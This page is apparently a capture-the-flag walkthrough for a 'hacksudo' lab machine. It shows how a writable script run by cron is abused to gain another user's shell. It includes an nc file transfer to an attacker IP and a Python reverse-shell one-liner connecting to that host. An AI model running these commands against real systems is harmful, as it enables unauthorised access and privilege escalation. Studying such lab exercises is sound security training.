<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.4 Gettin hackudo's shell (Third flag)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">4.4 Gettin hackudo's shell (Third flag)</h1><br/><br />In the home of “vishal” user there are several directories. One of them is “office".<br />You're already on SSH connection.<br /><br />1. List the “/home/vishal/office” directory.<br />	<div class="codebox"><div class="codebox">cvishal@hacksudo<span style="color:#a52a2a;font-weight:700">:</span>~<span style="color:#6a5acd;font-weight:400">$cd</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>home<span style="color:#a52a2a;font-weight:700">/</span>vishal<span style="color:#a52a2a;font-weight:700">/</span>office<br />vishal@hacksudo<span style="color:#a52a2a;font-weight:700">:</span>~<span style="color:#6a5acd;font-weight:400">$ls</span>&nbsp;-al</div></div><br /><br />	<span style="color:#ffa500;">Output:</span>	<br />	<img src="images/599-1.png" alt="images/599-1.png" /><br />	There are two interesting files: “hacksudo” and “manage.sh”.<br /><br />2. Open the files one by one.<br />    <div class="codebox"><div class="codebox">vishal@hacksudo<span style="color:#a52a2a;font-weight:700">:</span>~<span style="color:#a52a2a;font-weight:700">/</span>office<span style="color:#6a5acd;font-weight:400">$cat</span>&nbsp;hacksudo.c&nbsp;&nbsp;</div></div><br /><br />	<span style="color:#ffa500;">Output:</span>	<br />	<img src="images/599-2.png" alt="images/599-2.png" /><br />	The source code tells that the binary compiled from it would first set the setuid permission of the user executing it. <br />	Then, it would run the “manage.sh” script.<br />	<br />	<br />	<div class="codebox"><div class="codebox">vishal@hacksudo<span style="color:#a52a2a;font-weight:700">:</span>~<span style="color:#a52a2a;font-weight:700">/</span>office<span style="color:#6a5acd;font-weight:400">$cat</span>&nbsp;manage.sh</div></div><br /><br />	<span style="color:#ffa500;">Output:</span>		<br />	<img src="images/599-3.png" alt="images/599-3.png" /><br />	The user has access to write on the “manage.sh” file. So, he can write any commands that would be executed by the user “hacksudo”.<br />	<br />3. See the cron jobs.<br />	<div class="codebox"><div class="codebox">vishal@hacksudo<span style="color:#a52a2a;font-weight:700">:</span>~<span style="color:#a52a2a;font-weight:700">/</span>office<span style="color:#6a5acd;font-weight:400">$cat</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>etc<span style="color:#a52a2a;font-weight:700">/</span>crontab<br /></div></div><br />	<br />	<span style="color:#ffa500;">Output:</span>		<br />	<img src="images/599-4.png" alt="images/599-4.png" /><br />	You can see that a script getmanager is being run by the user hacksudo every minute.<br />	<br />4. Look at the content of the binary “getmanager”.<br /><br />	<div class="codebox"><div class="codebox"><span style="color:#0000ff;font-weight:400">#&nbsp;On&nbsp;your&nbsp;Kali&nbsp;Machine</span><br /><span style="color:#6a5acd;font-weight:400">$nc</span>&nbsp;-nlvp&nbsp;5555&nbsp;&gt;&nbsp;getmanager</div></div><br />	<br />	<div class="codebox"><div class="codebox"><span style="color:#0000ff;font-weight:400">#&nbsp;On&nbsp;target&nbsp;machine</span><br />nc&nbsp;192.168.12.27&nbsp;5555&nbsp;&lt;&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>home<span style="color:#a52a2a;font-weight:700">/</span>hacksudo<span style="color:#a52a2a;font-weight:700">/</span>getmanager</div></div><br /><br />	On your Kali Machine do Ctrl+C and run the following command.<br />	<br />	<div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$strings</span>&nbsp;getmanager</div></div><br />	<br />	<span style="color:#ffa500;">Output:</span>		<br />	<img src="images/599-5.png" alt="images/599-5.png" /><br />	<br />	There's the same binary that we saw in the “office” directory of “vishal”. So, when this binary is executed the “manage.sh” file is run too.<br />	<br />5. Add this code to the “manage.sh” file.<br />	<br /><code>python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.12.27",5555));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'</code>	<br />		<br />	<img src="images/599-6.png" alt="images/599-6.png" /><br />	<br />	The new line added will spawn a “reverse shell” on the port 5555.<br />	<br />6. On your Kali Machine open a connection with “netcat”.<br />	<div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$nc</span>&nbsp;-nlvp&nbsp;5555</div></div><br />	<br />	After a while you'll got a “reverse shell” as user “hacksudo”.<br />	<br />	<span style="color:#ffa500;">Output:</span>	<br />	<img src="images/599-7.png" alt="images/599-7.png" /><br />	<br />7. Get the flag.<br />	<div class="codebox"><div class="codebox">hacksudo@hacksudo<span style="color:#a52a2a;font-weight:700">:</span>~<span style="color:#6a5acd;font-weight:400">$cat</span>&nbsp;user.txt<br /></div></div><br /><br />	<span style="color:#ffa500;">Output:</span>		<br />	<img src="images/599-8.png" alt="images/599-8.png" /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>